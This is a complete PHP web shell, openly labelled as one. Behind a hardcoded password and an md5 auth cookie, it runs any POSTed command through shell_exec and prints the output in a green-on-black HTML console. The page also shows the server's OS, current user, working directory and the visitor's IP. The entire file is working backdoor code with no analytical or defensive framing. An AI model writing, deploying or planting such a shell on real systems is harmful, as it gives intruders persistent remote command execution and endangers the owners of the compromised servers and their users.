<?php
/*
#####################################################
simple webshell
#####################################################
*/

$password = "johen"; 

if(!isset($_POST['pass']) || $_POST['pass'] !== $password) {
    if(!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== md5($password)) {
        showLogin();
        exit;
    }
} else {
    setcookie('auth', md5($password), time()+3600);
}

$output = '';
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if(strtolower(substr(PHP_OS, 0, 3)) == "win") {
        $output = shell_exec("$cmd 2>&1");
    } else {
        $output = shell_exec("$cmd 2>&1");
    }
    if($output === null) $output = "[!] Command execution failed or disabled";
    if($output === "") $output = "[i] No output";
}

echo '<!DOCTYPE html>
<html>
<head>
    <title>Simple Web Shell</title>
    <style>
        body {
            background: #1a1a1a;
            color: #0f0;
            font-family: "Courier New", monospace;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #0d0d0d;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 20px;
        }
        h1 {
            color: #0f0;
            font-size: 20px;
            margin: 0 0 10px 0;
            border-bottom: 1px solid #0f0;
            padding-bottom: 10px;
        }
        .info {
            background: #111;
            padding: 10px;
            margin-bottom: 20px;
            border-left: 3px solid #0f0;
            font-size: 12px;
        }
        .info span {
            color: #ff0;
        }
        input[type="text"] {
            width: 80%;
            padding: 8px;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            font-family: "Courier New", monospace;
            font-size: 14px;
        }
        button {
            padding: 8px 20px;
            background: #0f0;
            border: none;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            font-family: "Courier New", monospace;
        }
        button:hover {
            background: #0a0;
        }
        .output {
            background: #000;
            border: 1px solid #333;
            padding: 15px;
            margin-top: 20px;
            white-space: pre-wrap;
            font-size: 12px;
            max-height: 500px;
            overflow: auto;
        }
        .output pre {
            margin: 0;
            color: #0f0;
            font-family: "Courier New", monospace;
        }
        .path {
            color: #ff0;
            display: inline-block;
            margin-right: 10px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔧 Simple Web Shell</h1>';
    
    // Informasi server
    $os = PHP_OS;
    $pwd = str_replace("\\", "/", getcwd());
    $user = function_exists("get_current_user") ? get_current_user() : "?";
    $ip = $_SERVER['REMOTE_ADDR'];
    
    echo "<div class='info'>
        📍 OS: <span>$os</span> | 👤 User: <span>$user</span> | 📂 PWD: <span>$pwd</span> | 🌐 IP: <span>$ip</span>
    </div>";
    
    echo '<form method="post">
        <span class="path">' . $pwd . '&gt;</span>
        <input type="text" name="cmd" id="cmd" value="' . htmlspecialchars(@$_POST['cmd']) . '" autofocus>
        <button type="submit">▶ RUN</button>
    </form>';
    
    if(isset($_POST['cmd'])) {
        echo '<div class="output">';
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
        echo '</div>';
    }
    
    echo '<script>document.getElementById("cmd").focus();</script>
</div>
</body>
</html>';

function showLogin() {
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Login - Web Shell</title>
        <style>
            body {
                background: #1a1a1a;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: "Courier New", monospace;
            }
            .login {
                background: #0d0d0d;
                border: 1px solid #0f0;
                padding: 30px;
                border-radius: 5px;
                text-align: center;
            }
            h2 {
                color: #0f0;
                margin-bottom: 20px;
            }
            input[type="password"] {
                padding: 10px;
                background: #000;
                border: 1px solid #0f0;
                color: #0f0;
                width: 200px;
                font-family: "Courier New", monospace;
            }
            button {
                padding: 10px 20px;
                background: #0f0;
                border: none;
                color: #000;
                font-weight: bold;
                cursor: pointer;
                margin-left: 10px;
            }
        </style>
    </head>
    <body>
        <div class="login">
            <h2>🔐 Authentication Required</h2>
            <form method="post">
                <input type="password" name="pass" placeholder="Enter password" autofocus>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
}
?>
